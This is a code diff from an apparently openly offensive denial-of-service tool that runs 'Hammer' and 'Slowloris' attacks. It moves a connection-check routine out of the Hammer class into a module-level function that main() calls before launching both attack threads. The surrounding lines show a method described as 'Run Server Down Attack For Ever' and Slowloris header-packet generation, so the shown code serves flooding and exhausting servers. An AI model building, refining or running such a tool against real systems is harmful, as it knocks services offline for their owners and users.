@@ -137,19 +137,6 @@ class Hammer:
         self.queue_one = Queue()
         self.queue_two = Queue()
     
-    def check_connection(self):
-        """
-            check connection is ok or Not!
-        """
-        
-        try:
-            h_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            h_socket.connect((self.server, self.port))
-            h_socket.settimeout(1)
-        except Exception as err:
-            print(FontColors.red(err.args[1]))
-            sys.exit(err.args[0])
-
     def server_down_attack(self):
         """
             Run Server Down Attack For Ever
@@ -219,8 +206,6 @@ class Hammer:
     
     def run(self):
         """Run Attacks"""
-        
-        self.check_connection()
         
         print(FontColors.green(f"host: {self.server} port: {self.port} turbo: {self.turbo}"))
         print(FontColors.yellow("Hammer Attack will start 5 second later ..."))
@@ -346,7 +331,20 @@ class Slowloris:
         
         packet = f"X-a: {randint(1, 5000)}\r\n"
         return packet.encode('utf-8')
-    
+
+def check_connection(host: str, port: int):
+        """
+            check connection is ok or Not!
+        """
+        
+        try:
+            h_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            h_socket.connect((host, port))
+            h_socket.settimeout(1)
+        except Exception as err:
+            print(FontColors.red(err.args[1]))
+            sys.exit(err.args[0])
+
 
 def run_hammer():
 
@@ -361,6 +359,8 @@ def run_slowloris():
 def main():
     
     get_parameter()
+    
+    check_connection(host, port)
     
     hammer_thread = threading.Thread(target=run_hammer, name="HammerDos")
     slowloris_thread = threading.Thread(target=run_slowloris, name="SlowlorisDos")
